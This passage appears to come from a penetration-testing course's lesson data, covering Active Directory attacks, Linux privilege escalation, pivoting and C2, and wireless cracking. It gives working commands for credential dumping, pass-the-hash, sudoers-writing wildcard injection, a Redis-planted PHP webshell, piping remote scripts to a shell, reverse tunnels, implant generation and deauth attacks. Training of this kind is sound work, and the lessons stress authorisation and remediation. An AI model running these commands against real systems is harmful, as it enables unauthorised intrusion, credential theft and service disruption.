# --- respond to your own capture: what those NTLMv2 hashes are worth ---
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt -r best64.rule
# Coerce authentication so you do not have to wait (PetitPotam / PrinterBug style):
impacket-printerbug zoth.local/user:pass@10.10.10.10 10.10.14.7
# Then relay or capture. Coercion + relay with signing off = Domain Admin, frequently in minutes.
\`\`\`

>! SMB signing disabled is *the* finding that turns a single compromised workstation into the whole domain. When you report it, give the client the fix as well: enforce SMB signing via GPO (\`Microsoft network server: Digitally sign communications (always)\`). Half of a good report is remediation.

>= If NTLM relay is blocked in the environment (signing enforced, SMB1 gone), do not force it. Kerberos-based attacks and misconfigured delegation are the next layer down, and they are covered two lessons on.`},

    { t:'NetExec (nxc): one tool across the whole domain', body:`NetExec is the maintained successor to CrackMapExec. Replace \`crackmapexec\` with \`nxc\` in any tutorial you read and the syntax is identical.

\`\`\`bash
# --- anatomy:  nxc <protocol> <target(s)> [auth] [action] [options] ---
PROTOCOLS='smb ldap mssql winrm rdp ssh ftp vnc nfs wmi'
# targets: single IP, CIDR, hostname, or a file of targets
\`\`\`

\`\`\`bash
# --- enumeration with credentials (the normal case) ---
nxc smb 10.10.10.10 -u user -p pass --shares
nxc smb 10.10.10.10 -u user -p pass --sessions          # where is that user logged in?
nxc smb 10.10.10.10 -u user -p pass --loggedon-users
nxc smb 10.10.10.10 -u user -p pass --local-groups
nxc smb 10.10.10.10 -u user -p pass --disks
nxc ldap 10.10.10.10 -u user -p pass --users             # AD user list
nxc ldap 10.10.10.10 -u user -p pass --groups
nxc ldap 10.10.10.10 -u user -p pass --password-not-required
nxc ldap 10.10.10.10 -u user -p pass --admin-count
nxc ldap 10.10.10.10 -u user -p pass --kerberoasting kerberoast.txt
nxc ldap 10.10.10.10 -u user -p pass --asreproast asrep.txt
nxc ldap 10.10.10.10 -u user -p pass --trusted-for-delegation
\`\`\`

\`\`\`bash
# --- code execution paths, in rough order of stealth ---
nxc winrm  10.10.10.20 -u user -p pass -x 'whoami'            # WinRM first: least noisy
nxc smb    10.10.10.20 -u user -p pass -x 'whoami'            # wmiexec-ish
nxc smb    10.10.10.20 -u user -p pass -X '$PSVersionTable'   # PowerShell
nxc smb    10.10.10.20 -u user -p pass --exec-method smbexec -x 'whoami'
impacket-psexec zoth.local/user:pass@10.10.10.20              # loud, SYSTEM, classic
impacket-wmiexec zoth.local/user:pass@10.10.10.20             # less noisy than psexec
evil-winrm -i 10.10.10.20 -u user -p pass                     # nice interactive shell over 5985
nxc mssql  10.10.10.10 -u sa -p pass --local-auth -x 'whoami' # DB server -> OS in many configs
\`\`\`

\`\`\`bash
# --- credential harvesting and abuse ---
nxc smb 10.10.10.0/24 -u user -p pass --continue-on-success    # spray one cred everywhere
nxc smb 10.10.10.0/24 -u user -H <NThash> --continue-on-success  # pass-the-hash
nxc smb 10.10.10.10 -u user -p pass --sam --lsa                # dump hashes (admin)
nxc smb 10.10.10.10 -u user -p pass -M lsassy                  # lsass dump via modules
nxc smb 10.10.10.10 -u user -p pass --ntds                     # DCSync-like: the crown jewels
nxc smb --help | grep -i module ; nxc smb -L                   # every module available
\`\`\`

>= \`nxc smb <range> -u <user> -H <nthash>\` is the one command that most reliably finds where a stolen hash still works. It is fast, quiet-ish, and \`--continue-on-success\` means one hit does not stop the sweep.

>= \`--ntds\` against a domain controller gives you every password hash in the domain. That is Domain Admin — and the definition of "engagement over, call the client".`},

    { t:'BloodHound: stop guessing, read the attack path', body:`BloodHound maps AD as a graph and shows you the shortest path from where you are to Domain Admin. It replaced years of manual guesswork.

\`\`\`bash
# --- 1. install the collector, run it with any domain credential ---
sudo apt install -y bloodhound.py      # or: pipx install bloodhound
bloodhound-python -u user -p pass -d zoth.local -ns 10.10.10.10 -c all
ls *.json                              # users, groups, computers, sessions, ACLs, GPOs
# -c all collects everything; use -c DCOnly for a light, low-impact collection
\`\`\`

\`\`\`bash
# --- 2. start the server and load the data ---
sudo neo4j console &                    # first run: open http://localhost:7474, set the password
bloodhound &                            # login, then: Upload Data -> select all the .json files
\`\`\`

\`\`\`text
--- 3. the searches that actually find you a path ---
"Shortest Paths from Owned Principals"        <- set your foothold as owned first
"Shortest Paths to Domain Admins"
"Find Principals with DCSync Rights"
"Find Computers where Domain Users are Local Admin"
"Find AS-REP Roastable Users (DontReqPreAuth)"
"Find Kerberoastable Users"
"Find All Paths from Kerberoastable Users"
"Shortest Paths from Kerberoastable Users"
"Find Workstations where Domain Users Can RDP"
"Find Computers with Unsupported Operating Systems"
"List all Kerberoastable Accounts"
--- 4. the edges that matter ---
MemberOf            -> nested group membership is how rights actually accrue
AdminTo             -> local admin on a computer
HasSession          -> a user's creds/hash are (or were) on that box -> steal and move
CanPSRemote / CanRDP-> direct access
GenericAll / WriteDACL / ForceChangePassword / Owns  -> ACL abuse: reset, grant, take over
AddKeyCredentialLink (Shadow Credentials) -> auth as the target without their password
AllowedToDelegate / AllowedToAct   -> delegation abuse, often the shortest path of all
DCSync              -> game over
\`\`\`

\`\`\`bash
# --- 5. execute the path. Common ACL abuses, one tool ---
# ForceChangePassword: set a new password for a user you control the right over
impacket-changepasswd zoth.local/user:pass@10.10.10.10 -newpass 'Pwn3d!2026' -altuser target -altpass oldpass
# Shadow Credentials: authenticate as the target without cracking anything
certipy shadow auto -u user@zoth.local -p pass -account target -dc-ip 10.10.10.10
# WriteDACL / GenericAll -> grant yourself DCSync
impacket-dacledit -action write -rights DCSync -principal user -target-dn 'DC=zoth,DC=local' zoth.local/user:pass -dc-ip 10.10.10.10
\`\`\`

\`\`\`bash
# --- Kerberos without hashcat: delegation and certificate abuse ---
certipy find -u user@zoth.local -p pass -dc-ip 10.10.10.10 -vulnerable -stdout
certipy req -u user@zoth.local -p pass -ca CORP-CA -template User -upn administrator@zoth.local -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10        # -> administrator's NT hash
impacket-getST -spn cifs/dc01.zoth.local -impersonate administrator zoth.local/user:pass
#   constrained/unconstrained delegation, RBCD, ESC1-ESC8 - see Certipy + GhostPack docs
\`\`\`

>! BloodHound collection with \`-c all\` against a large domain generates significant LDAP/SMB traffic and can be logged as reconnaissance. \`-c DCOnly\` gathers most of the ACL data with far less noise. Ask your client contact what their monitoring looks for — an engagement where you trip the SOC during a "stealth test" is a wasted engagement.

>! Kerberoasting is *offline* cracking of a service account hash. It is quiet on the network and the correct first move on almost any AD engagement: no lockouts, no loud authentication failures, and service accounts frequently have weak, never-rotated passwords set to "never expires".

>= Certificate Services abuse (ESC1-ESC8 via Certipy) is the single most common modern AD privilege escalation path, because AD CS is deployed everywhere and misconfigured by default in the same handful of ways. If a CA exists, enumerate it.`}
  ],
  keyIdeas:[
    'SMB signing disabled + coercion = Domain Admin. Check signing on every sweep.',
    'NetExec (nxc) replaced CrackMapExec: same syntax, new binary name.',
    'BloodHound turns guessing into reading a graph. Own your foothold, then find shortest paths.',
    'Kerberoasting is quiet and offline; do it early. Check for AS-REP roastable users too.',
    'AD CS (Certipy, ESC1-ESC8) is the most common modern escalation path. Enumerate the CA.',
    'Collection noise matters: DCOnly for stealth, `all` only with approval.'
  ],
  tools:['t-netexec','t-impacket','t-bloodhound','t-responder','t-evilwinrm','t-mimikatz','t-certipy','t-windows-privesc-doc'],
  labs:['lab-smb','lab-ad'],
  xp:220
},

/* ---------------------------------------------------------------- 09 ---- */
{
  id:'m09', n:'09', phase:'EXPLOIT', title:'Linux Privilege Escalation',
  blurb:'From www-data to root: enumeration, SUID/SGID, sudo misconfigurations, cron abuse, capabilities, container escapes, and the mindset that finds the path nobody documented.',
  why:'A web shell is not a finding; root is. Privilege escalation is pure methodology — no exploit needed for most real-world paths, just careful reading of a misconfigured system.',
  lessons:[
    { t:'Enumerate first: linpeas and manual checks', body:`\`\`\`bash
# --- automated enumeration: fast, noisy, and the right first pass on a lab box ---
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# or transfer the script and run it locally - always read the output end to end
./linpeas.sh -a 2>/dev/null | tee linpeas-out.txt

# --- run these FIRST on any new shell, before anything heavy ---
id; sudo -l                    # sudo rules are the single most common privesc
uname -a; cat /etc/os-release  # kernel + distro -> which CVEs apply
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -2000 -type f 2>/dev/null          # SGID
getcap -r / 2>/dev/null                          # capabilities
cat /etc/crontab; ls -la /etc/cron.* /var/spool/cron/crontabs 2>/dev/null
crontab -l 2>/dev/null; systemctl list-timers --all 2>/dev/null | head -30
cat ~/.bash_history; ls -la ~/.ssh 2>/dev/null
ss -tulpn | grep LISTEN                          # internal-only services = next targets
env; cat /proc/self/environ | tr '\\0' '\\n'       # leaked credentials are common
\`\`\`

**Set up instant transfer once**, then you can move any tool to the target:

\`\`\`bash
# on YOUR machine, in the folder with your tools
python3 -m http.server 8000
# on the TARGET:
wget http://10.10.14.7:8000/linpeas.sh -O /tmp/l.sh && chmod +x /tmp/l.sh && /tmp/l.sh
curl -o /tmp/l.sh http://10.10.14.7:8000/linpeas.sh
# no wget/curl? use /dev/tcp, base64 paste, or nc:
nc -lp 9001 < linpeas.sh        # attacker      |      nc 10.10.14.7 9001 > /tmp/l.sh
\`\`\`

>= Do not run linpeas, then a 40-minute scan, then a kernel exploit guesser. Run the six manual commands above \`id\`, \`sudo -l\`, \`find\`, \`crontab\`, \`capabilities\`, and \`history\` — first. They find the majority of paths in under a minute, and they teach you the system instead of handing you a wall of colour.`},

    { t:'The canonical paths, with real commands', body:`\`\`\`bash
# === 1. sudo misconfiguration: the highest-yield category ===
sudo -l
# "user may run: (root) NOPASSWD: /usr/bin/find"  -> find is a root-exec tool
sudo find . -exec /bin/sh \\; -quit
# any tool that can run a command/editor/loader can give root. Reference + payloads:
#   GTFOBins  -> gtfobins.github.io    (sudo, SUID, capabilities, and more)
sudo vim -c ':!/bin/sh'          &&  sudo less /etc/hosts  then  !/bin/sh
sudo awk 'BEGIN{system("/bin/sh")}'
sudo python3 -c 'import os; os.system("/bin/sh")'      # if env_keep allows
sudo env /bin/sh
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# LD_PRELOAD (sudo -l shows env_keep+=LD_PRELOAD):
#   create evil.so with a constructor calling setuid(0); then sudo LD_PRELOAD=./evil.so <allowed cmd>

# === 2. SUID/SGID binaries ===
find / -perm -4000 -type f 2>/dev/null
# cross-reference EVERY result against GTFOBins. Example: SUID /usr/bin/nmap (old versions)
nmap --interactive  then:  !sh
# SUID bash itself: /bin/bash -p        SUID cp: cp /bin/bash /tmp/rootbash && /tmp/rootbash -p
# not in GTFOBins? check strings, check version, check its config file permissions

# === 3. cron and timers ===
cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.daily/
# pspy: watch processes and cron jobs in real time - the tool for this problem
wget http://10.10.14.7:8000/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
# wildcard injection: if a root cron runs "tar czf /backup/backup.tar.gz *" in a writable dir:
echo 'echo "x ALL=(root) NOPASSWD:ALL" >> /etc/sudoers' > privesc.sh && chmod +x privesc.sh
touch -- '--checkpoint=1' && touch -- '--checkpoint-action=exec=sh privesc.sh'   # in that dir

# === 4. capabilities ===
getcap -r / 2>/dev/null
# cap_setuid+ep on python/perl -> instant root
/usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# cap_dac_read_search on tar -> read /etc/shadow;  cap_net_raw -> sniff; etc.

# === 5. kernel exploits: last resort, always verify ===
uname -r
searchsploit "linux kernel 5.8"; searchsploit -w 'linux kernel local privilege'
# Dirty Pipe (CVE-2022-0847, 5.8-5.16), Dirty COW (2.6.22-4.8), PwnKit (CVE-2021-4034, pkexec),
# OverlayFS (CVE-2021-3493), Baron Samedit (CVE-2021-3156, sudo)
ls -la /usr/bin/pkexec && /usr/bin/pkexec --version     # PwnKit check
# ALWAYS read the exploit, back up files it modifies, and expect a crash + snapshot rollback.
\`\`\`

\`\`\`bash
# === 6. credentials and secrets lying around ===
grep -rEi 'password|passwd|secret|api[_-]?key|token' /home /var/www /opt /srv 2>/dev/null
find / -name '*.conf' -o -name '*.config' -o -name 'id_rsa' -o -name '.env' 2>/dev/null | head -50
cat /var/www/html/wp-config.php 2>/dev/null           # CMS configs: DB creds, sometimes reused
ls -la /var/backups /tmp /var/tmp 2>/dev/null
mysql -u root -p'' -e 'select user,authentication_string from mysql.user;' 2>/dev/null
# ~/.ssh/id_rsa -> try it everywhere:  ssh -i id_rsa root@10.10.10.5
# reuse a found password with sudo:   sudo -l  then  sudo -u root <allowed>  /  su -
\`\`\`

\`\`\`bash
# === 7. container reality: you may be in a container, and that changes everything ===
cat /proc/1/cgroup | head -5; ls -la /.dockerenv 2>/dev/null
# docker group membership = root on the host, trivially:
id | grep -q docker && docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# container escape surfaces: --privileged, mounted docker.sock, hostPath mounts, CAP_SYS_ADMIN
ls -la /var/run/docker.sock 2>/dev/null      # if writable -> host escape
mount | grep -E 'overlay|host' ; capsh --print 2>/dev/null | head
# k8s service account tokens are credentials:
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
\`\`\`

>= GTFOBins (gtfobins.github.io) is the answer to "this binary is SUID or sudo-allowed. Now what?" Bookmark it, filter by SUID/capabilities/sudo, and use it every time. It is the single highest-leverage reference in Linux privesc.`},

    { t:'When there is no misconfiguration: the expert mindset', body:`Sometimes nothing obvious is wrong — and that is when methodology separates you from the people who give up and call the box "unintended".

**The escalation mindset, in order:**

1. **Read everything you can.** Source code of the web app, config files, log files, comments, git history, backups. Credentials are usually *written down* somewhere, not cracked.
2. **Compare intended state to actual state.** Is this directory world-writable but shouldn't be? Is this service running as root but shouldn't? Is this user in a group that grants nothing today but will grant something else? Misconfiguration is a relative concept — know what normal looks like.
3. **Look at what the system *does* on a schedule.** Cron, timers, log rotation, backup jobs, monitoring agents. Anything root runs repeatedly is a target.
4. **Look sideways, not just up.** Another user's home directory, an internal-only service on localhost, a database socket, a Unix socket, an unauthenticated Redis on 6379. Lateral movement is often easier than vertical.
5. **Track every username and password you have seen**, including ones that failed. Password reuse across services and users is the norm.
6. **Only then reach for a kernel exploit** — and only after verifying, from the target's actual kernel version and patch level, that the CVE applies.

\`\`\`bash
# The "read everything" pass, in practice
cat /var/www/html/*.php 2>/dev/null | grep -A3 -iE 'password|db_|mysqli|connect'
find / -type f -newer /etc/hostname 2>/dev/null | grep -v /proc | head -30   # recent changes
ls -la /root 2>/dev/null; sudo -l 2>/dev/null | grep -v 'may not'
git -C /var/www/html log --oneline --all 2>/dev/null    # accidental secrets in history
strings /usr/local/bin/suspicious-binary | grep -iE 'pass|key|token'
\`\`\`

\`\`\`bash
# The "internal service" pass: what can we reach that the outside cannot?
ss -tulpn; netstat -tulpn 2>/dev/null
curl -s http://127.0.0.1:8080/ ; curl -s http://127.0.0.1:6379/ ; curl -s http://127.0.0.1:9200/
redis-cli -h 127.0.0.1 info 2>/dev/null | head
# Redis without auth -> write a webshell or an SSH key, or load a module:
#   redis-cli -h 127.0.0.1 config set dir /var/www/html
#   redis-cli -h 127.0.0.1 config set dbfilename shell.php
#   redis-cli -h 127.0.0.1 set x '<?php system($_GET["c"]); ?>' && redis-cli save
\`\`\`

>! Kernel exploits and "public one-liners that got someone else root" are the highest-risk path: kernel panics take down the target, and a crash mid-engagement is an incident. Snapshot, test on an identical VM first, back up the files any exploit modifies, and only run it when you have authorisation for the possibility of a reboot.

>= **Documentation is the deliverable.** For every step, write down the command, the output, and why it worked. "Found SUID find, ran GTFOBins payload, root" is a finding. "Got root somehow" is not.

>= The real skill here is not knowing 40 privesc tricks. It is being able to look at a system you have never seen and reason about trust boundaries: who can run what, who reads what, who owns what — and where those three answers disagree.`}
  ],
  keyIdeas:[
    'Six commands first: id, sudo -l, SUID find, capabilities, crontab, bash_history.',
    'sudo + GTFOBins is the highest-yield category; check every allowed binary against it.',
    'pspy for cron discovery, wildcard injection for tar/rsync cron jobs, getcap for capabilities.',
    'Kernel exploits last; verify version, snapshot first, expect a crash.',
    'Read files before you break them: credentials are usually written down, not cracked.',
    'The mindset is trust-boundary reasoning: who runs, reads and owns what — and where they disagree.'
  ],
  tools:['t-linpeas','t-gtfobins','t-pspy','t-searchsploit'],
  labs:['lab-privesc'],
  xp:200
},

/* ---------------------------------------------------------------- 10 ---- */
{
  id:'m10', n:'10', phase:'POST', title:'Pivoting, Tunneling & C2',
  blurb:'Reach networks you cannot route to: ligolo-ng, chisel and SSH tunneling, SOCKS through proxychains, port forwarding, and the difference between a pivot and a command-and-control framework.',
  why:'Corporate networks are segmented, and your foothold is the only machine that can see the crown jewels. Pivoting is how a single low-privilege shell becomes a full internal assessment.',
  lessons:[
    { t:'Know which tunnel you need', body:`Four distinct problems, four distinct tools. Confusing them wastes hours.

\`\`\`text
PROBLEM                                TOOL OF CHOICE            WHY
need to reach one internal service     SSH -L / socat            simplest, one port
need to reach a whole internal subnet  ligolo-ng                 tun interface: nmap works NATIVELY
                                       (or chisel + proxychains)  no proxychains, much faster
need a route from a host with no ssh   chisel / socat / nc pivot  works over plain HTTP/TLS
need interactive multi-host control    C2 framework               sessions, tasks, team server
\`\`\`

\`\`\`bash
# --- simplest first: forward ONE port to your machine ---
ssh -L 8080:10.10.20.5:80 user@10.10.10.5      # then browse http://localhost:8080
ssh -L 3389:10.10.20.20:3389 user@10.10.10.5   # RDP an internal host through the pivot
# --- expose YOUR service to the internal network (reverse forward) ---
ssh -R 9001:127.0.0.1:9001 user@10.10.10.5     # pivot can now fetch your tools
\`\`\`

\`\`\`bash
# --- dynamic SOCKS proxy through any SSH access ---
ssh -D 1080 -N -f user@10.10.10.5              # SOCKS5 on localhost:1080
proxychains4 -q nmap -sT -Pn -p80,445 10.10.20.0/24
curl --socks5 127.0.0.1:1080 http://10.10.20.5/
\`\`\`

\`\`\`bash
# --- proxychains discipline: TCP only, and 90% of your problems live here ---
cat /etc/proxychains4.conf
#   [ProxyList]
#   socks5 127.0.0.1 1080
#   # chain multiple pivots here: socks5 127.0.0.1 1081  (second hop)
# RULES THAT SAVE YOU TIME:
#   * SYN scans (-sS) DO NOT WORK through proxychains. Use -sT (TCP connect). Always.
#   * UDP does not work. At all. Find another route or another tool.
#   * tools that spawn subprocesses or use raw sockets (nmap -O, masscan) will misbehave.
#   * --unprivileged / -PE on nmap reduces false results through a SOCKS tunnel.
proxychains4 -q nxc smb 10.10.20.10 -u user -p pass --shares
proxychains4 -q evil-winrm -i 10.10.20.20 -u user -p pass
\`\`\`

>! proxychains will silently break tools rather than error out: a scan returns "host down" not because the host is down but because the SYN never traversed the proxy. If a tool gives implausible results through proxychains, suspect the tunnel — not the target. This is why ligolo-ng (next lesson) is usually worth the setup cost.`},

    { t:'ligolo-ng: a real network interface for pivoting', body:`ligolo-ng creates a TUN interface on your machine, routed through the agent. nmap, masscan, Responder, NTLM relay — everything works natively, because you genuinely have a route to the internal network. No proxychains required.

\`\`\`bash
# --- 1. grab the binaries (attacker + target) and start the proxy ---
# from github.com/nicocha30/ligolo-ng/releases: proxy (your arch), agent (target arch)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
\`\`\`

\`\`\`bash
# --- 2. run the agent on the pivot (NO root needed on the target) ---
./agent -connect 10.10.14.7:11601 -ignore-cert
# Windows:   .\\agent.exe -connect 10.10.14.7:11601 -ignore-cert
# Through a SOCKS-only foothold:  ./agent --socks 127.0.0.1:1080 -connect ...
\`\`\`

\`\`\`text
--- 3. in the proxy console ---
ligolo-ng » session                       # list and select the agent
[Agent : user@lab-web01] » ifconfig       # what networks can the pivot see? (10.10.20.0/24!)
[Agent : user@lab-web01] » interface_list
[Agent : user@lab-web01] » interface_add --tun ligolo
[Agent : user@lab-web01] » tunnel_start   # hit Enter, accept the tunnel
[Agent : user@lab-web01] » start         # or: start --tun ligolo
--- 4. back in another terminal, add the route and go to work natively ---
sudo ip route add 10.10.20.0/24 dev ligolo
nmap -sS -sV -p- --min-rate 2000 10.10.20.0/24          # real SYN scan. Works. Fast.
nxc smb 10.10.20.0/24 -u user -p pass --shares           # no proxychains anywhere
responder -I ligolo -wdv                                 # even poisoning works
nmap -sU --top-ports 50 10.10.20.5                       # UDP works too
\`\`\`

\`\`\`text
--- extras worth knowing ---
listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:9001   # expose a port back through the pivot
listener_list
session                                   # switch agents; add multiple hops
author: nicocha30      docs: docs.ligolo.ng
\`\`\`

>= Caveats, straight from the docs: on your own machine you need the ability to create a tun interface (root or CAP_NET_ADMIN). When scanning through the tunnel, use \`nmap -PE\` or \`--unprivileged\` to avoid false positives, because the tunnel's behaviour differs subtly from a real NIC. Multiplexing many simultaneous connections needs \`--max-inflight\` tuning on very fast links.

>+ One agent, one command, and suddenly \`10.10.20.0/24\` is just another network on your laptop. This is the single biggest quality-of-life upgrade available to a pentester, and it is free and open source.`},

    { t:'chisel, socat, and C2 frameworks', body:`\`\`\`bash
# --- chisel: HTTP/WebSocket tunnel; great when only 80/443 egress is allowed ---
# attacker (server):
./chisel server -p 8000 --reverse --socks5
# target (client) - reverse SOCKS back to you:
./chisel client 10.10.14.7:8000 R:socks
# reverse port forward instead:
./chisel client 10.10.14.7:8000 R:8080:127.0.0.1:80
# then proxychains4 nxc smb ... via the socks port chisel opens (default 1080)
# Windows target:  .\\chisel.exe client 10.10.14.7:8000 R:socks
\`\`\`

\`\`\`bash
# --- socat: the Swiss army knife for one-off relays ---
# target has no tools? socat or nc is usually enough.
socat TCP-LISTEN:4444,fork TCP:10.10.20.5:3389        # relay a port through the pivot
socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:80 # expose a localhost-only service
socat -d -d pty,raw,echo=0 tcp-listen:9001,reuseaddr  # give yourself a TTY
# no socat? nmap can relay with:  nmap -g 4444 10.10.20.5 ... / ncat --sh-exec
ncat -l 4444 --sh-exec "ncat 10.10.20.5 3389" --keep-open
\`\`\`

\`\`\`text
--- C2 frameworks: when you need many sessions, persistence studies, and team ops ---
framework        licence      notes
Metasploit       free (BSD)   the reliable default; multi/handler + meterpreter routing
Sliver           free (BSD)   modern, mTLS/Https/DNS/WireGuard, implant generation, armory
Empire           free         PowerShell/.NET post-exploitation (ships with Parrot)
Havoc            free         modular, modern C2 profile concept
Cobalt Strike    commercial   industry standard in red teams; licences are expensive
Mythic           free         modular C2 with a web UI and many agents
\`\`\`

\`\`\`bash
# --- Sliver: a 5-command tour, because it is the best free modern C2 ---
sliver-server                     # then:  new-operator --name you  /  multiplayer
sliver > generate --mtls 10.10.14.7 --os linux --save /tmp/implant
sliver > mtls --lport 8888        # start the mTLS listener first, actually
sliver > sessions                 # list / interact
sliver (SESSION) > info; ps; download /etc/passwd; portfwd add --remote 10.10.20.5:445
sliver (SESSION) > pivots          # Sliver's own pivot support
\`\`\`

>! A C2 framework is a large, powerful, easily-misused tool. Implants phone home to your IP, persist on the target, and will be found by the client's EDR — which is fine in an authorised red team engagement and catastrophic otherwise. In a compliance pentest, stick to Metasploit and manual shells; in a red team exercise, agree the C2 infrastructure and egress rules with the client *before* you generate an implant.

>= Real infrastructure for a professional red team engagement lives on cloud VPS in a domain categorised as "business/technology", with redirectors in front of the team server, TLS certificates from a real CA, and separate long-haul versus interactive channels. That is its own discipline — but knowing it exists tells you why "running a listener on your engagement laptop" is fine for a lab and wrong for a real red team operation.`}
  ],
  keyIdeas:[
    'One port → ssh -L. One subnet → ligolo-ng. HTTP-only egress → chisel. One-off relay → socat.',
    'proxychains breaks silently: TCP connect only (-sT), no UDP, watch for false "host down".',
    'ligolo-ng gives you a real tun interface: native nmap, masscan, responder, UDP. No proxychains.',
    'Metasploit routes and Sliver pivots both work; pick by engagement type, not by novelty.',
    'C2 infrastructure must be agreed with the client before implant generation, not after.'
  ],
  tools:['t-chisel','t-ligolo','t-proxychains','t-socat','t-sliver','t-ssh'],
  labs:['lab-pivot'],
  xp:180
},

/* ---------------------------------------------------------------- 11 ---- */
{
  id:'m11', n:'11', phase:'POST', title:'Wireless & Radio',
  blurb:'802.11 fundamentals, monitor mode, WPA/WPA2 handshake capture and cracking, PMKID, evil twin and WPA3 reality — including the legal line you must not cross.',
  why:'Wireless is where curiosity most often becomes a crime: radio signals cross property boundaries whether you intend them to or not. Learn the theory and the tooling on your own hardware and in dedicated labs, because there is no "I only meant to look" defence.',
  lessons:[
    { t:'The legal line, before any tool', body:`Wireless is unique in security testing: **your packets enter other people\'s property**. There is no equivalent of "I only scanned my own port".

- **Your own network, your own hardware:** fine. This is where you practise.
- **A client\'s network, with written scope naming the SSID/BSSID and the physical site:** fine, professional, common.
- **A coffee shop, your neighbour, an airport, a hotel:** not fine, no matter how open the network is, no matter that you "did not decrypt anything". In the US this has been prosecuted under the CFAA; in the UK under the Computer Misuse Act; in Germany and many EU states there is specific radio/telecommunications law on top.
- **Deauthentication attacks** ("just a deauth to capture a handshake") cause denial of service to real users. On a client network that is a service outage. Off it, it is a criminal act against devices you do not own.

\`\`\`bash
# --- and the hardware question, because it decides everything ---
# You need a card whose driver supports monitor mode AND packet injection.
iw dev                                  # list wireless interfaces
iw list | grep -A8 'Supported interface modes'   # does it say *monitor*?
lspci | grep -i -E 'network|wireless'
\`\`\`

\`\`\`text
Cards that reliably work (internal chipset in brackets):
  Alfa AWUS036ACH    (RTL8812AU)   dual-band, injection, the classic
  Alfa AWUS036NHA    (AR9271)      2.4GHz, extremely reliable, cheap
  Alfa AWUS036ACM    (MT7612U)     dual-band, good Linux support
  TP-Link TL-WN722N  (AR9271!)     v1 only - v2/v3 have a Realtek chip that does not inject
  Panda PAU09        (RT5572)      dual-band, decent
Chipsets to avoid for injection: Broadcom (many laptops), most Intel (good for monitoring, no injection)
\`\`\`

>! Check the chipset, not the marketing, before buying. "Supports monitor mode" on a product page frequently means "can see packets", not "can inject them". AR9271 and RTL8812AU are the two chipsets that have worked for fifteen years.`},

    { t:'Monitor mode, capture, crack', body:`**Own lab only.** AP = your own router; the PSK is one you set.

\`\`\`bash
# === 1. prepare the interface ===
sudo airmon-ng check kill                   # kill NetworkManager/wpa_supplicant, they fight you
sudo airmon-ng start wlan0                  # creates wlan0mon
sudo iwconfig                                # confirm: wlan0mon, Mode:Monitor
# modern alternative without airmon-ng:
sudo ip link set wlan0 down && sudo iw dev wlan0 set type monitor && sudo ip link set wlan0 up

# === 2. survey the airspace (this is passive and legal on your own kit) ===
sudo airodump-ng wlan0mon                    # all APs: BSSID, channel, encryption, clients
sudo airodump-ng -w survey --output-format csv wlan0mon    # save it
# lock onto one AP + its channel so you capture everything:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
\`\`\`

\`\`\`bash
# === 3a. capture a WPA handshake (the classic 4-way) ===
# You need a client to (re)connect. Options, best first:
#   - wait for a natural reconnect (zero impact, may take a while)
#   - send a deauth to force a reconnect (DoS - only on a network you own/are scoped for)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# confirm capture: airodump shows "WPA handshake: AA:BB:CC:DD:EE:FF" top-right
\`\`\`

\`\`\`bash
# === 3b. PMKID: no client needed, no deauth, no DoS ===
# Presses the AP directly for a crackable value. Often the *ethical* first choice on a client network.
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
# or with hcxhashtool/wifite:
sudo wifite --pmkid-only
\`\`\`

\`\`\`bash
# === 4. convert and crack ===
# pcap -> hashcat 22000 format
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
cat hash.hc22000
# or via aircrack-ng (fast for small lists, uses CPU):
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF cap-01.cap
# or hashcat (GPU, rules, is the right tool for a serious attempt):
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hash.hc22000 company-cewl.txt -r best64.rule
# WPA is per-network-salted, so wordlists + rules + masks over known patterns
# (company name + year, phone number patterns) is where real success comes from
\`\`\`

\`\`\`bash
# === 5. if you have the PSK: what does it expose? (own lab / scoped client) ===
sudo wpa_supplicant -B -i wlan0 -c <(wpa_passphrase "MyLabSSID" "MyLabPSK")
sudo dhclient wlan0
nmap -sn 192.168.1.0/24                    # who is on this network
# The real finding is almost never the PSK strength. It is what the wireless
# network puts you next to: unpatched internal hosts, flat internal subnets,
# and the fact that a guest VLAN is not actually segmented from the corporate one.
\`\`\`

>= **The report finding is not "we cracked your WiFi."** It is "the corporate wireless network is reachable from the car park, uses a single PSK shared by 400 staff, and once joined places the attacker on the same layer-2 segment as the internal file server — with no 802.1X, no client isolation, and no NAC." That is a finding worth money. Note the physical distance from which the AP was reachable; that is the part executives understand.`},

    { t:'Rogue APs, WPS, WPA3, and the modern reality', body:`\`\`\`bash
# --- WPS: still the fastest "win" where it is enabled ---
sudo wash -i wlan0mon                        # find WPS-enabled APs
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1    # -K 1 = Pixie Dust attack
# Pixie Dust recovers the WPS PIN in seconds-to-minutes when the AP is vulnerable.
# Defensively: WPS should be OFF. That is the entire remediation, and it always goes in the report.
\`\`\`

\`\`\`bash
# --- evil twin / rogue AP: the engagement where you may legally do this ---
# This is a *social-engineering / physical* test. Never do it where you are not scoped for it.
# Tooling (pick one, all are powerful and all are abuse-prone):
#   wifiphisher    - rogue AP + phishing portals, has built-in templates
#   EAPHammer      - WPA-Enterprise (802.1X) attacks, evil twin with a real cert
#   hostapd-mana   - the low-level engine; credential capture from clients
